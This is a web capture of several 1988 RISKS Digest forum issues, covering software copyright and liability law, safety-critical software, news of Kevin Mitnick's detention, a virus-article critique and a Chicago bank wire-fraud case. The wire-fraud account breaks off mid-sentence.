preventing his mother's death from a drugs overdose.  The Duesseldorf court
dismissed the accusation of murder, laid all blame with the computer error,
and declared the woman unaccountable for her actions.  It is not known whether
any civil liability action followed this tradegy.

Two years ago, a software bug in a (canadian) radiation therapy machine in
Texas caused a number of fatal accidents due to a radiation overdose (cf.
Datamation, May 1987).

It seems that such (re)liability factors were partly responsible for the recent
withdrawal of all software protection proposals in Dutch Bill 19.921 on Com-
bating Piracy of Copyright Works, after which the Bill was passed by the Dutch
House of Representatives on 8 November 1988.  In effect, the software clauses
proposed to exclude so-called "computer programs" (otherwise undefined in the
Bill) from the Dutch equivalent of Section 107 USC ("Fair Use"), under inclu-
sion of a clause rather similar to Section 117 USC.  Unfortunately, insuffi-
cient attention was given to morally acceptable activities as licenced under
anglo-american Fair Use / Fair Dealing (including "reverse engineering" and
analysis in either a profit or not-for-profit context).  In fact, the Bill
attempted to use copyright law for creating trade-secret protection on soft-
ware, as was the case with the French and West-German Copyright revisions of
1985.

Also, it was proposed that programs should have a sufficient PERSONAL
creativity level under the standard doctrine of Dutch case law for copyright
protection.  This caused quite a debate since legal entities may not qualify
for title to "authorship" under such circumstances unless special agreements
are drafted between employer and employee, in view of the moral (personal)
rights under the Berne Copyright Convention (the Universal Copyright Convention
does not recognize any moral rights).  If software can be viewed as a
"writing", no personal creativity requirements exist under the Dutch
"copijreght" doctrine, and the Minister of Justice seems to have desired to
elicit a fundamental debate on "copyrights" for legal entities versus "author's
rights" for natural persons.

At present, the discussion evolves around the June 1988 Green Paper of the
Commission of the European Communities on "Copyright and the Challenge of
Technology", in which a number of questions are posed on all kinds of copyright
works including software and databases.  Important issues are (a) the relation
between software property rights under the pending European Directive on Soft-
ware Protection versus software (re)liability under the 1985 European Directive
on Product Liability, and (b) to what extent a legal entity may claim "author's
rights" under the Berne Copyright Convention with its strong emphasis on moral
rights for natural persons.  In short: is software an impersonal "product" to
be protected under industrial property law, or a personal "service" to be pro-
tected under intellectual property law?

Unlike the anglo-american "work-for-hire" rule, a legal entity's title to
authorship has been a hotly debated issue in continental-european intellectual
property law, pursuant to section 27(2) of the Universal Declaration of Human
Rights (New York, 1948) and to section 15(1)c of the International Covenant on
Economic, Social and Cultural Rights (New York, 1966).  During last year's
"Tripartite Meeting on Salaried Authors and Inventors" organized by the Inter-
national Labour Office in Geneva, no agreement could be reached on this issue.

If the natural author is the legal author under the Berne Convention, it stands
to reason that he is also liable for any errors caused by "his" work, notwith-
standing his employer's title to (and liability for) the pure information/ideas
underlying "his" work.  Here, the relation between (objective, impersonal)
information/ideas/contents which are NOT protected under traditional copyright
and the form/expression of the work which are protected under copyright is at
stake, and it is of interest that recent publications in the field of intel-
lectual property law attempt to shift the boarderline of copyright into pure
information, despite the USA's First Amendment and various international in-
struments that purport to protect "Freedom of Information".  From a liability
point of view, this makes sense, since each individual is morally (and materi-
ally?) responsible for what he decides to publish, whether it is a highly per-
sonal recipe for making a nuclear device or an objective method fur curing can-
cer.  From a scientific point of view, one may argue just the opposite.  At any
rate, private property rights and public information rights should remain in
balance, as the Dutch events have demonstrated.

A paper "Going Dutch between Copyright and Droit d'Auteur" on some of these
issues will appear in Computer Law &amp; Practice (London) 5(1988)2 [special issue
on the European  Communities' Green Paper].

Herman J. Woltring

Study-committee on Software and Chips Protection, Netherlands Association for
Computers and Law, wwtmhjw@heitue5.bitnet,  na.woltring@na-net.stanford.edu

Biomedical &amp; Health Technology            Software Engineering Department
Eindhoven University of Technology        Philips Medical Systems
The Netherlands                           The Netherlands

[A disclaimer indemnifying an employer or other party is not required under
 the Berne Convention!]

   [The Duesseldorf case is in SIGSOFT Software Engineering Notes (SEN) 10 3
   1985, and the Therac 25 radiation therapy case is discussed in SEN 11 3 and
   12 3, 1986 and 1987, respectively.]

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
 New EMI Shielding Material
</A>
</H3>
<address>
&lt;<A HREF="mailto:Boebert@DOCKMASTER.ARPA">
Boebert@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Tue, 13 Dec 88 13:56 EST
</i><PRE>

I just had an opportunity to examine a description and a sample of a new EMI
shielding material called SAFENSHIELD from International Paper.  This is a
nonwoven fabric that looks a lot like the old "silkspan" we used to cover model
airplanes in days of yore ...  also the material teabags are made out of.  The
fabric has an embedded metallic substance which provides the shielding; can be
put up like wallpaper, does not require bonding, and comes in two grades; the
heavy grade is about $2.25 a square foot in small quantities, and is
solderable.  Attenuation specs look impressive.  Brochure states that it is
being used to shield Pontiac Fiero radios from ignition emissions.  It must be
a pretty new material because it is being sold from the corporate research
center instead of a product division of International Paper.  Point of contact
in brochure is David Diermeier, (914) 577 7447.  I don't know anything about
this stuff except what is in the sales literature, but if it lives up to its
specs it sure looks like a cheap and easy countermeasure to a variety of EMI
RISKS.

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.95.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.97.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-49</DOCNO>
<DOCOLDNO>IA012-000131-B036-212</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.97.html 128.240.150.127 19970217024626 text/html 19949
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:44:52 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 97</TITLE>
<LINK REL="Prev" HREF="/Risks/7.96.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.98.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.96.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.98.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 97</H1>
<H2> Wednesday 21 December 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Software Safety report in UK 
</A>
<DD>
<A HREF="#subj1.1">
Jane Hesketh via Philip Wadler
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Over-reliance on a single source of data 
</A>
<DD>
<A HREF="#subj2.1">
Cory Kempf
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Computers vs Scandanavian Design 
</A>
<DD>
<A HREF="#subj3.1">
Bob Frankston
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Supercomputer used to "solve" math problem 
</A>
<DD>
<A HREF="#subj4.1">
Henry Cox
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Armed with a keyboard and considered dangerous 
</A>
<DD>
<A HREF="#subj5.1">
Dan Franklin
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Another article on the dangerous keyboard artist 
</A>
<DD>
<A HREF="#subj6.1">
Jerry Leichter
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Virus article debunked 
</A>
<DD>
<A HREF="#subj7.1">
Stephen Page
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Software Safety report in UK
</A>
</H3>
<address>
Philip Wadler 
&lt;<A HREF="mailto:wadler@cs.glasgow.ac.uk">
wadler@cs.glasgow.ac.uk
</A>&gt;
</address>
<i>
Wed, 21 Dec 88 10:48:42 GMT
</i><PRE>

The following may be of interest to Risks readers.  The message is from Jane
Hesketh of Edinburgh Computing and Social Responsibility.  -- Phil Wadler

&gt;From jane@aiva Mon Dec 19 10:52:12 1988

Computer Weekly 15.12.88

"Software safety cannot be guaranteed, warns DTI"

A draft report for the Government on safety-critical software emphasises the
impossibility of guaranteeing error-free programs, despite their widespread
use to control aeroplanes and nuclear power plants.

Commissioned by the DTI and carried out by the Institution of Electrical 
Engineers and the BCS, the report has met with mixed reactions from the  
safety-critical software community.

One of the more ominous warnings contained in the report is that an entirely
unambiguous specification is not strictly feasible.

"The uncertainty in our knowledge of the real world creates the potential
for our specifications to be wrong, including being incomplete," the report
states. " This is apart from any mistakes we may introduce when we come to
describe the requirements in specifications".

The report is not describing remote safety-critical applications but ones
already in operation. While Sizewell B will be the first UK nuclear power
plant whose safety system is computer-controlledd, the safety of a nuclear
plant on the NorthWest coast of France is already in the hands of software.

One of the criticisms of the draft report is that it is limited too closely
to safety-critical software in the UK. The whole thing lacks a European
perspective" says Robin Bloomfield, chairman of consultancy delard, which
co-wrote the MoD safety-critical software standard 00-55. " For example, it
should have included a current West German proposal for a standard to cover
all industries".

Another criticism is that the report does not go far enough in trying to 
bring together safety-critial standards, which many in industry now feel to 
be diffuse and inconsistent.

"This document has not covered standards sufficiently," says David Youll,
who is software engineering group manager at the Cranfield IT Institute.

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Over-reliance on a single source of data
</A>
</H3>
<address>
&lt;<A HREF="mailto:cory@gloom.UUCP">
cory@gloom.UUCP
</A>&gt;
</address>
<i>
Fri, 16 Dec 88 17:13:11 EST
</i><PRE>
Organization: Alloy Computer Products, Framingham Mass.

With all of this discussion on over-reliance on automation, an anecdote that
a friend told me a while back came to mind.  I though that it was
appropreate to the current discussion.

Ed (the guy who told this to me) is a Master Chief Petty Officer (ret.).
Part of his responsibilities included checking out new members of his
squadron in the flight simulator.  One of the pilots that he had to check
out in the simulator was acting a bit 'cockey'.  While the new guy was not
looking, Ed disconnected the Artificial Horizon.  (for those of you not
familiar with airplane cockpits, this is a control that is used to inform
the pilot of the current orientation of the aircraft about the X &amp; Y axes
(it doesn't tell direction).  there are several other instraments that give
the same data, notably the turn and bank indicator) The pilot took of (the
simulator) and almost immediatly flipped over and crashed.  He did this
three times in a row.  The reason?  Over-reliance on a single channel of
data input -- the Artificial Horizon.  It showed the plane in a level
flight, while the turn and bank indicator showed the correct data.

This occured in a simulator.  Nobody died as a result.  It does 
illustrate what happens when humans (and computers for that matter)
depend on a single source of data, and that source is spewing out
bogus data (which can sometimes happen).

Other conclusions I will leave to you... this is too long already.

Cory Kempf     UUCP: encore.com!gloom!cory

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Computers vs Scandanavian Design
</A>
</H3>
<address>
bobf@lotus.UUCP 
&lt;<A HREF="mailto:Bob Frankston">
Bob Frankston
</A>&gt;
</address>
<i>
Wed Dec 21 07:49:41 1988
</i><PRE>

The Boston Globe had an article on the near demise of Scandanavian Design -- a
70 store furniture chain that was doing $100M/yr.  According to the article
what caused things to fall apart was an attempt to convert from an antiquated
Honeywell system to a modern ($4.5M) IBM system.

The article also mentions a lack of senior management.  The observation is that
computers are not turnkey systems one just installs but they require an MIS
staff with much expertise.  The reason is not that computers are complicated
but that they are integral to the operation of one's business.

While I expect that one will, in the future, buy systems that take care of the
business and allow management to concentrate on the interesting aspects
(whatever that might be for an individual), we need to make it clear that the
current systems are idiot savants.

What is missing is a deep computer literacy that allows nonprofessionals (and
many professionals in the field) to understand the computer as a component of a
system.  It is one thing to teach Basic in school, it is another to impart a
deeper understanding of computation.

A trivial example was an office manager I had.  I was implementing a property
sticker system and wanted red permanent stickers and black removeable stickers.
She did this, but both sets had the same numbers, she had assumed that a red
158 and a black 158 were different.  While that may be true visually and could
even be stored that way, it wasn't an effective distinction in such a system.
What was missing was the concept of a unique ID.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Supercomputer used to "solve" math problem
</A>
</H3>
<address>
Henry Cox  
&lt;<A HREF="mailto:cox@spock.ee.mcgill.ca">
cox@spock.ee.mcgill.ca
</A>&gt;
</address>
<i>
Wed, 21 Dec 88 09:23:26 est
</i><PRE>

BEYOND THE MIND'S POWERS - SUPERCOMPUTER CRACKS OLD MATH PROBLEM

[ From the Montreal Gazette, 21 December 1988 ]

  A team of Concordia University [ another Montreal area university ]
computer scientists using a U.S. Defence Department supercomputer have
solved a theoretical mathematics problem so complex that it is beyond
the capability of the human mind to comprehend.
  Clement Lam, who is a member of the matemetical computation division at
Concordia's computer science department, said the complexity forces
scientists to accept the supercomputer's solution more or less on faith. [
The RISKS connection... ]
  This raises important questions about the power of computers and whether a
proof that mankind cannot fully understand can be accepted.  "This is one of
the very important philosophical questions," Lam said.  [ A practical
question as well, I think.  How can we be sure the answer is correct if we
can't check it? ]
  He added, however, that he is confident the mathematical problem faced by
him and his colleagues "is solved".
  The problem, first posed in the 18th century by a Swiss mathematician,
deals with the question of whether a mathematical entity called a "finite
projective plane of order 10" can exist.
  Lam and three collegues, John McKay, Larry Theil, and Stanley Swiercz,
concluded that such an entity cannot exist.
  The problem deals with whether numbers and groups of numbers can be
organized in a particular fashion.  To discover the solution, concordial
scientists had to search through more than 1,000,000,000,000,000
combinations of possibilities - or about 50,000 for every human being.
  He said studying just one possibility would be like having the computer
examine every combination and outcome of a chess move, but much more
complex.  The skill was is organizing and programming the computer.

[ The RISKS are obvious. The willingness of people to accept a computer's
answer on faith (whether at the cash register at the grocery store or in the
university environment) remains disturbing.  		          Henry Cox]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
 Re: Armed with a keyboard and considered dangerous [<A HREF="/Risks/7.96.html">RISKS-7.96</A>]
</A>
</H3>
<address>
Dan Franklin 
&lt;<A HREF="mailto:dan@WATSON.BBN.COM">
dan@WATSON.BBN.COM
</A>&gt;
</address>
<i>
Wed, 21 Dec 88 16:58:02 EST
</i><PRE>

F. Baube (commenting on a news article quoted by Rodney Hoffman in <A HREF="/Risks/7.95.html">RISKS-7.95</A>):
&gt; &gt; [..] Federal prosecutors also obtained a court order restricting
&gt; &gt; Mitnick's telephone calls from jail, fearing he might gain access
&gt; &gt; to a computer over the phone lines....
&gt; .. and presumably he would whistle at 1200 bps.

Hardly.  All he needs is a touch-tone phone.

First, it may well be possible to play games with phone service using only
touch-tone phones; I could easily believe that each local phone exchange has
a "secret" number that allows their employees to alter the characteristics
of phone lines for testing purposes.

But more importantly, he could have set up a phone number in advance which
would allow him to use a touch-tone pad like a keyboard.  (With 12 keys on
the pad, two keypresses are sufficient to represent any ASCII character,
including control characters.)  Add text-to-speech equipment for the other
direction, and he's all set.

Having been jailed before, he could easily have prepared for being jailed or
otherwise kept away from keyboards again.  This private line and the equipment
need not be in his house or under his name, so there's no way anyone could be
sure it wasn't available to him.
                                              	Dan Franklin

              [Also noted by Deshler Armstrong  &lt;dela@ee.rochester.edu&gt; ]

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Another article on the dangerous keyboard artist
</A>
</H3>
<address>
LEICHTER-JERRY@CS.YALE.EDU
&lt;<A HREF="mailto:"Jerry Leichter ">
"Jerry Leichter 
</A>&gt;
</address>
<i>
Tue, 20 Dec 88 10:56 EST
</i><PRE>

     "LOS ANGELES (UPI) - In a rare ruling, a convicted computer hacker was
ordered held without bail Thursday on new charges he gained illegal access to
secret computer information of Leeds University in England and Digital
Equipment Corp.
     Kevin David Mitnick, 25, of Panorama City, is named in two separate
criminal complaints charging him with computer fraud.  Assistant U.S. Attorney
Leon Weidman said it is unusual to seek detention in such cases, but he
considers Mitnick 'very, very dangerous' and someone who 'needs to be kept away
from computers.'
     U.S. Magistrate Venetta Tassopulos granted the no-bail order after Weidman
told her that since 1982, Mitnick had also accessed the internal records of the
Los Angeles Police Department, TRW Corp. and Pacific Telephone.
     'He could call up and get access to the whole world,' Weidman said.
     Weidman said Mitnick had served six months in juvenile hall for stealing
computer manuals from a Pacific Telephone office in the San Fernando Valley and
using a pay phone to destroy $200,000 worth of data in the files of a northern
California company.
     Mitnick later penetrated the files of TRW Corp. and altered the credit
information of several people, including his probation officer, Weidman said.
     He said Mitnick also used a ruse to obtain the name of the police
detective investigating him for hacking when he was a student at Pierce
College.  He telephoned the dean at 3 a.m., identified himself as a campus
security guard, reported a computer burglary in process and asked for the name
of the detective investigating past episodes, Weidman said.
     The prosecutor said Mitnick also gained access to the Police Department's
computer data and has impersonated police officers and judges to gain
information.
     A complaint issued Monday charges Mitnick with using a computer in
suburban Calabasas to gain access to Leeds University computer data in England.
He also allegedly altered long-distance phone costs incurred by that activity
in order to cover his mischief.
     A second complaint issued Thursday charges Mitnick with stealing
proprietary Digital Equipment Corp. software valued at more than $1 million and
designed to protect the security of its computer data.  Mitnick allegedly
stored the stolen data in a University of Southern California computer.
     An affidavit filed to support the complaints said unauthorized intrusions
into the Digital computer have cost the company more than $4 million in
computer downtime, file rebuilding and lost employee worktime.
     A computer operator at Voluntary Plan Assistance in Calabasas, which
handles disability claims for private firms, told investigators he allowed his
friend unauthorized access to the firm's computer.
     From that terminal, Mitnick gained access to Digital facilities in the
United States and abroad, the affidavit said."

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Virus article debunked
</A>
</H3>
<address>
Stephen Page 
&lt;<A HREF="mailto:sdpage%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK">
sdpage%prg.oxford.ac.uk@NSS.Cs.Ucl.AC.UK
</A>&gt;
</address>
<i>
Wed, 21 Dec 88 20:15:21 gmt
</i><PRE>

A disappointingly journalistic article entitled "Rewriting the Book on
Viruses" appears in the December 1988 edition of Computer Newsletter,
a publication of the British Computer Society. It describes a talk
from a Dr Alan Solomon, "who runs the only Data Recovery hospital in
the world". Here are some extracts:

"... Solomon insists that viruses are actually extremely scarce.
'Viruses are very rare indeed. I'm getting about 1 or 2 reports a week
which turn out to be genuine viruses. That's in a population of half
a million computers,' estimates Solomon..."

"The biggest virus problem is misinformation, according to Solomon, who
told the audience that 'everything you've read and everything you know
about viruses is wrong'. He goes on to state an example, 'People are
calling everything a virus. At the height of commotion, a couple of months
ago, I had a person call in and say "I've got a problem, I think it's a
virus. My printer won't print a pound sign."'"

"Viruses do not travel on executable disks, they spread on blank disks.
Solomon warns, 'The real threat is data disks ... 99% of the time boot
sector viruses are travelling on data disks.'"

"Solomon prescribes a few tips on preventative measures: get software from
a reputable source, if a boot fails -- switch the computer off, stay informed
and make a clean copy of DOS and write protect it."

There are two interesting flaws in this article:
1.  No where in the article, with the sole exception of the word "DOS"
    in the extract above, does the author point out that the article
    defines "computers" to mean "machines of an IBM-PC architecture
    running the PC/MS-DOS operating system". Thus he dangerously
    misleads the reader into worrying about blank mainframe disks
    or, worse, into not worrying about executable disks on other
    machines.

2.  His assertion that viruses are "extremely scarce" is incorrect for
    some hardware/software architectures, in particular the Macintosh.
    I would not like to guess at a percentage, but certainly almost
    every Macintosh user I have met has suffered from an nVir attack!

Disinformation is always dangerous. Perhaps RISKS readers need to arm them-
selves with a short nontechnical fact sheet for their colleagues who
are interested in finding out what is really going on.
Has anyone written something simple along these lines, which we could
show to people who find all the journalism confusing (or wrong)?

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/7.96.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.98.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B32-50</DOCNO>
<DOCOLDNO>IA012-000131-B036-234</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/7.02.html 128.240.150.127 19970217024641 text/html 23436
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 02:45:08 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 7: Issue 2</TITLE>
<LINK REL="Prev" HREF="/Risks/7.01.html">
<LINK REL="Up" HREF="/Risks/index.7.html">
<LINK REL="Next" HREF="/Risks/7.03.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/7.01.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.7.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/7.03.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 7: Issue 2</H1>
<H2>  Thursday 2 June 1988  </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
Happenstance and $70 Million 
</A>
<DD>
<A HREF="#subj1.1">
Patrick A. Townson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Optimisers too tacit, perhaps? 
</A>
<DD>
<A HREF="#subj2.1">
Tim McDaniel
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Re: Optimisers; Telecommunications Redundancy 
</A>
<DD>
<A HREF="#subj3.1">
Michael Wagner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Major security hole in some sun systems     
</A>
<DD>
<A HREF="#subj4.1">
Pete Cottrell and Steve Miller and Jim Purtilo and Chris Torek
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
Happenstance and $70 Million
</A>
</H3>
<address>
&lt;<A HREF="mailto:Patrick_A_Townson@cup.portal.com">
Patrick_A_Townson@cup.portal.com
</A>&gt;
</address>
<i>
Wed Jun  1 23:28:30 1988
</i><PRE>
Reply-Path: sun!portal!cup.portal.com!Patrick_A_Townson ?

On May 13, 1988, the day they allegedly embezzled $70 million from First
National Bank of Chicago, two key players met in the waiting room at the
Chicago &amp; Northwestern Railroad Suburban Station.

Armand Moore, convicted swindler said by prosecutors to have masterminded
the crime, was quick to assure bank employee Gabriel Taylor that the plan
had gone off without a hitch.

"You did fine. Everything went great," Moore told Taylor. "Just sit tight.
I won't forget to give you your share of the loot." Confident that all was
well, Moore and the other co-schemers went out to look at new Jaguars and
Cadillacs the next day.

But by Monday morning, May 16, the scheme had begun to unravel. Gabriel
Taylor decided it best to begin cooperating with the government, and seven
men, including Moore and another employee of First National Bank were
indicted by a federal grand jury in the case two days later.

First National has said it anticipates no loss to itself or its customers
in the case. Although $19.8 million remained at large for several days
following the exposure of the scheme, the bank has now retrieved it after
filing suit against Citibank, which at first had refused to return it.

The effort failed 'only by the merest happenstance. This was a big near-miss,'
according to Robert Edwards, a Hagerstown, MD consultant on money transfer
security.

In the case at hand, about $70 million was sent out of the bank in just 64
minutes by wire transfer that Friday morning. Several trillion dollars per
week is moved around the country by wire transfer, in which funds are moved
from one bank to another by electronic debits and credits to interbank account
at the institutions involved.

First National has been busily telling everyone who would listen that the
attempt was foiled because of 'the effeciency of our system, and the many
controls we use....'.  Cynical insiders at the bank and members of the
financial community in Chicago say that is nonsense. The scheme was a
relatively simple minded one which failed because of the perpetrators'
greed and apparent lack of sophistication.

"It's not the hackers and phreakers who are making trouble in most cases,"
said Edwards. "It's the employees who are working us over. When you have
collusion between an employee and somebody on the outside, it is almost
impossible to prevent fraud like this." He added, "The wire transfer business
is extremely risky at best. This is one of the nightmares you live with."

In the First National case, the plot allegedly centered on Moore, known by
his street name of 'The Chairman'. Moore came from his home in Detroit about
the first of May to meet with his cousin Herschel Bailey of Chicago, one
of those charged in the scheme.

Bailey knew Otis Wilson, who had worked at First National for six years
in the wire room. He was also aquainted with Gabriel Taylor, another wire
room employee. Both Taylor and Moore were low-level employees at First
National. Both were young guys from the south side of Chicago who had gotten
jobs at the bank as older teenagers a few years before.

There were several planning meetings at the downtown Quality Inn hotel,
according to federal prosecutors. To entice the two bank employees, Moore
flashed photographs of Rolls-Royce automobiles and luxury yachts, according
to Assistant United States Attorneys Jeffrey Stone and Scott Mendeloff.

Moore allegedly promised Taylor and Wilson he would give them $28 million of
the loot in exchange for their cooperation. At first, Moore wanted to steal
$232 million, but Taylor convinced him that was just too greedy and risky.

Taylor and Bailey allegedly provided the others with confidential information
regarding wire transfers, including the words and phrases bank employees
would say to one another on the phone. They allegedly provided confidential
information about the accounts of several large corporate customers of First
National. They studied computer printouts to determine which of these various
customers had the highest amount of protection against overdrafts, and which
had the highest volume of transactions in their account, meaning that missing
funds would be difficult to immediatly reconcile. They rejected several of
the accounts they reviewed, including Hilton Hotels Corp., for which the
limits were too low.

The men allegedly selected three companies -- Merrill Lynch &amp; Co,. United
Airlines and Brown-Forman Corp. They called First National, purporting to
be with those companies, requesting wire transfers. Taylor arranged to be
the person who made confirming telephone calls, the government claims.

Under First National's procedures, the employee who receives the customer's
request for a wire transfer cannot also be the employee who makes the
confirming phone call. Furthermore, a third employee is required to actually
operate the electronics involved in passing the money.

Prosecutors said the plan called for Taylor to hang up the phone if he was
the person who received the incoming call. Calls to the wire room are
routed automatically by a call distributor-like system; no one knows who will
get which incoming phone call.

Keeping alert to the incoming calls, which were expected at certain times,
Taylor then managed to get the task of making the callbacks, but instead of
calling the actual companies involved, he called his accomplices at Bailey's
house on the south side. Although the bank keeps a computerized record of
all outgoing calls from phones in the wire room, the log was seldom checked
and in any event was never checked immediately.

The money was transferred to accounts of Austrian banks at Chase Manhattan
Bank and Citibank in New York that Friday morning between 8:30 and 9:34 AM.

Later Friday, Moore and another of his accomplices met with officials of
another Chicago bank to discuss how they could move money from an overseas
account and convert it to cash here in Chicago.

The scheme was derailed early Monday when United Airlines officials noticed
a big overdraft in one of its accounts and immediately called First
National.  Brown-Forman did the same. What the schemers did not realize was
